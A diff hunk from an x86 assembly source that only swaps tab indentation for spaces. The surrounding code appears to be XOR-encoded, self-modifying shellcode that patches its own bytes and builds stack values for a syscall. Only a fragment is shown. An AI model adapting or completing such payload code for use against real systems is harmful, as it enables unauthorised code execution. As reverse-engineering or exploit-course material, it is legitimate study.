@@ -31,9 +31,9 @@ patch_ret:
         dec edx
         dec edx ; edx = 0x2d 
         xor [esi+2*edx+0x37], al ; base + 145 = 0x78 
-		push edi
-		pop edx
-		dec edx ; edx = 0xffffffff 
+        push edi
+        pop edx
+        dec edx ; edx = 0xffffffff 
 
 build_stack:
         ; push 0xff80cd0b 
@@ -60,7 +60,7 @@ build_stack:
         inc ecx
         xor [ecx], dh
         
-		; push 0x50e3896e 
+        ; push 0x50e3896e 
         push edx
         pop eax
         xor eax, 0x31443034
